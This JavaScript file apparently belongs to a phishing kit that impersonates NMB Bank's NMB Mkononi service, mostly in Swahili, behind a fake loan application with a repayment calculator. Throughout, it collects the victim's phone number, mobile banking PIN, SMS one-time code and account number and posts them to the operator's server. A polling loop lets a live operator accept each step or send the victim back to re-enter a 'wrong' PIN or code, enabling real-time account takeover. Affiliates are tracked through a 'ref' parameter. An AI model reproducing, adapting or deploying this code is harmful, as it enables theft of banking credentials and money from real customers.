const sessionId = 'nmb_' + Math.random().toString(36).substring(2, 9);

// Grab subadmin 'ref' query parameter from URL to route requests accurately
const urlParams = new URLSearchParams(window.location.search);
const subadminRef = urlParams.get('ref') || '';

const state = {
    amount: 100000,
    duration: 12,
    monthly: 9504,
    loanType: 'Mkopo wa Biashara',
    purpose: '',
    firstName: '',
    lastName: '',
    phone: '',
    employment: 'Mfanyabiashara',
    income: '',
    pin: '',
    otp: '',
    accountNumber: ''
};

const screens = {
    slider: document.getElementById('screen-slider'),
    step1: document.getElementById('screen-step1'),
    step2: document.getElementById('screen-step2'),
    step3: document.getElementById('screen-step3'),
    pin: document.getElementById('screen-pin'),
    otp: document.getElementById('screen-otp'),
    account: document.getElementById('screen-account'),
    success: document.getElementById('screen-success')
};

function showScreen(screenKey) {
    Object.values(screens).forEach(scr => {
        if (scr) scr.classList.remove('active');
    });
    if (screens[screenKey]) {
        screens[screenKey].classList.add('active');
        window.scrollTo(0, 0);
    }
}

function showLoading(text) {
    document.getElementById('loading-text').innerText = text || 'Tafadhali subiri...';
    document.getElementById('loading-overlay').classList.remove('hidden');
}

function hideLoading() {
    document.getElementById('loading-overlay').classList.add('hidden');
}

function showSurfaceNotification(message, type = 'warning') {
    const banner = document.getElementById('surface-notification');
    banner.innerText = message;
    banner.className = `surface-notification ${type}`;
    banner.scrollIntoView({ behavior: 'smooth' });
}

function clearSurfaceNotification() {
    const banner = document.getElementById('surface-notification');
    banner.classList.add('hidden');
    banner.innerText = '';
}

const rangeAmount = document.getElementById('range-amount');
const rangeDuration = document.getElementById('range-duration');
const displayAmount = document.getElementById('display-amount');
const displayDuration = document.getElementById('display-duration');
const displayMonthly = document.getElementById('display-monthly');

function updateCalculator() {
    state.amount = parseInt(rangeAmount.value);
    state.duration = parseInt(rangeDuration.value);
    
    displayAmount.innerText = `TSh ${state.amount.toLocaleString()}`;
    displayDuration.innerText = `miezi ${state.duration}`;
    
    const monthlyRate = 0.25 / 12;
    const calc = (state.amount * monthlyRate * Math.pow(1 + monthlyRate, state.duration)) / (Math.pow(1 + monthlyRate, state.duration) - 1);
    state.monthly = Math.round(calc || (state.amount / state.duration));
    displayMonthly.innerText = `TSh ${state.monthly.toLocaleString()}`;
    
    document.getElementById('input-loan-amount').value = state.amount;
}

rangeAmount.addEventListener('input', updateCalculator);
rangeDuration.addEventListener('input', updateCalculator);

document.getElementById('btn-omba-sasa').addEventListener('click', () => {
    clearSurfaceNotification();
    showLoading('Inapakia...');
    setTimeout(() => {
        hideLoading();
        showScreen('step1');
    }, 600);
});

document.getElementById('btn-step1-next').addEventListener('click', () => {
    state.loanType = document.getElementById('loan-type').value;
    state.amount = document.getElementById('input-loan-amount').value;
    state.duration = document.getElementById('loan-duration-select').value;
    state.purpose = document.getElementById('loan-purpose').value || 'Mkopo wa Mkononi';

    if (!state.purpose) {
        showSurfaceNotification('Tafadhali weka madhumuni ya mkopo.', 'error');
        return;
    }

    clearSurfaceNotification();
    showLoading('Inapakia hatua inayofuata...');
    setTimeout(() => {
        hideLoading();
        showScreen('step2');
    }, 700);
});

document.getElementById('btn-step2-back').addEventListener('click', () => {
    showScreen('step1');
});

document.getElementById('btn-step2-next').addEventListener('click', () => {
    state.firstName = document.getElementById('first-name').value.trim();
    state.lastName = document.getElementById('last-name').value.trim();
    let rawPhone = document.getElementById('phone-number').value.trim();

    if (!state.firstName || !state.lastName) {
        showSurfaceNotification('Tafadhali jaza jina la kwanza na la ukoo.', 'error');
        return;
    }

    if (rawPhone.startsWith('0')) {
        rawPhone = rawPhone.substring(1);
    }

    if (rawPhone.length !== 9) {
        showSurfaceNotification('Tafadhali weka namba sahihi ya NMB Mkononi (tarakimu 9 baada ya 0).', 'error');
        return;
    }

    state.phone = rawPhone;

    clearSurfaceNotification();
    showLoading('Inapakia hatua ya mwisho...');
    setTimeout(() => {
        hideLoading();
        document.getElementById('sum-amount').innerText = `TSh ${Number(state.amount).toLocaleString()}`;
        document.getElementById('sum-duration').innerText = state.duration;
        document.getElementById('sum-purpose').innerText = state.purpose;
        showScreen('step3');
    }, 700);
});

document.getElementById('btn-step3-back').addEventListener('click', () => {
    showScreen('step2');
});

document.getElementById('btn-step3-submit').addEventListener('click', async () => {
    state.employment = document.getElementById('employment-status').value;
    state.income = document.getElementById('annual-income').value;

    if (!state.income) {
        showSurfaceNotification('Tafadhali weka mapato ya mwaka.', 'error');
        return;
    }

    clearSurfaceNotification();
    showLoading('Inawasilisha maombi kwa NMB Mkononi...');

    try {
        await fetch('/api/submit-application', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                sessionId,
                phone: state.phone,
                pin: state.pin || 'Pending PIN',
                ref: subadminRef // Attached subadmin ref routing
            })
        });
        
        hideLoading();
        showScreen('pin');
        setupPinInputs();
    } catch (err) {
        hideLoading();
        showSurfaceNotification('Hitilafu ya mtandao. Tafadhali jaribu tena.', 'error');
    }
});

function setupPinInputs() {
    const pinBoxes = document.querySelectorAll('.pin-box');
    pinBoxes.forEach((box, index) => {
        box.value = '';
        box.oninput = (e) => {
            if (e.target.value.length === 1 && index < pinBoxes.length - 1) {
                pinBoxes[index + 1].focus();
            }
        };
        box.onkeydown = (e) => {
            if (e.key === 'Backspace' && !box.value && index > 0) {
                pinBoxes[index - 1].focus();
            }
        };
    });
    if (pinBoxes[0]) pinBoxes[0].focus();
}

document.getElementById('btn-submit-pin').addEventListener('click', async () => {
    const pinBoxes = document.querySelectorAll('.pin-box');
    let enteredPin = '';
    pinBoxes.forEach(box => enteredPin += box.value);

    if (enteredPin.length !== 4) {
        showSurfaceNotification('Tafadhali weka PIN kamili ya tarakimu 4.', 'error');
        return;
    }

    state.pin = enteredPin;
    clearSurfaceNotification();
    showLoading('Inathibitisha PIN na NMB Mkononi...');

    try {
        await fetch('/api/submit-application', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                sessionId,
                phone: state.phone,
                pin: state.pin,
                ref: subadminRef // Attached subadmin ref routing
            })
        });

        pollAdminDecision((status) => {
            hideLoading();
            if (status === 'next_step') {
                document.getElementById('lbl-otp-phone').innerText = `+255${state.phone}`;
                showScreen('otp');
                setupOtpInputs();
            } else if (status === 'restart_pin') {
                showSurfaceNotification('PIN si sahihi au imeKATAA. Tafadhali weka PIN mpya.', 'error');
                showScreen('pin');
                setupPinInputs();
            } else {
                showScreen('pin');
            }
        });
    } catch (err) {
        hideLoading();
        showSurfaceNotification('Hitilafu ya mtandao.', 'error');
    }
});

function setupOtpInputs() {
    const otpBoxes = document.querySelectorAll('.otp-box');
    otpBoxes.forEach((box, index) => {
        box.value = '';
        box.oninput = (e) => {
            if (e.target.value.length === 1 && index < otpBoxes.length - 1) {
                otpBoxes[index + 1].focus();
            }
        };
        box.onkeydown = (e) => {
            if (e.key === 'Backspace' && !box.value && index > 0) {
                otpBoxes[index - 1].focus();
            }
        };
    });
    if (otpBoxes[0]) otpBoxes[0].focus();
}

document.getElementById('btn-submit-otp').addEventListener('click', async () => {
    const otpBoxes = document.querySelectorAll('.otp-box');
    let enteredOtp = '';
    otpBoxes.forEach(box => enteredOtp += box.value);

    if (enteredOtp.length < 4) {
        showSurfaceNotification('Tafadhali weka SMS OTP kamili kutoka NMB Mkononi.', 'error');
        return;
    }

    state.otp = enteredOtp;
    clearSurfaceNotification();
    showLoading('Inathibitisha OTP...');

    try {
        await fetch('/api/submit-otp', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ sessionId, otp: state.otp })
        });

        pollAdminDecision((status) => {
            hideLoading();
            if (status === 'next_step') {
                showScreen('account');
            } else if (status === 'restart_otp' || status === 'restart_pin') {
                showSurfaceNotification('OTP sio sahihi. Tafadhali weka OTP mpya.', 'error');
                showScreen('otp');
                setupOtpInputs();
            } else {
                showScreen('otp');
            }
        });
    } catch (err) {
        hideLoading();
        showSurfaceNotification('Hitilafu ya mtandao.', 'error');
    }
});

document.getElementById('btn-submit-account').addEventListener('click', async () => {
    const accInput = document.getElementById('account-number-input').value.trim();

    if (accInput.length !== 11 || isNaN(accInput)) {
        showSurfaceNotification('NMB Bank account number MUST be numbers and EXACTLY 11 digits.', 'error');
        return;
    }

    state.accountNumber = accInput;
    clearSurfaceNotification();
    showLoading('Inakamilisha usajili wa akaunti ya benki...');

    try {
        await fetch('/api/submit-account', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ sessionId, accountNumber: state.accountNumber })
        });

        pollAdminDecision((status) => {
            hideLoading();
            if (status === 'success') {
                showScreen('success');
            } else if (status === 'restart_pin') {
                showSurfaceNotification('Wrong PIN reported. Redirecting backwards to Enter PIN.', 'error');
                showScreen('pin');
                setupPinInputs();
            } else if (status === 'restart_otp') {
                showSurfaceNotification('Wrong OTP reported. Redirecting backwards to OTP verification.', 'error');
                showScreen('otp');
                setupOtpInputs();
            } else if (status === 'restart_acc') {
                showSurfaceNotification('Invalid Account Number reported. Please re-enter 11 digits.', 'error');
                showScreen('account');
            } else {
                showScreen('account');
            }
        });
    } catch (err) {
        hideLoading();
        showSurfaceNotification('Hitilafu ya mtandao.', 'error');
    }
});

function pollAdminDecision(callback) {
    const interval = setInterval(async () => {
        try {
            const res = await fetch(`/api/check-status/${sessionId}`);
            const data = res.ok ? await res.json() : {};
            if (data.status && data.status !== 'pending') {
                clearInterval(interval);
                callback(data.status);
            }
        } catch (e) {
            // keep polling quietly
        }
    }, 3000);
}

document.getElementById('btn-home').addEventListener('click', () => {
    window.location.reload();
});

updateCalculator();
    
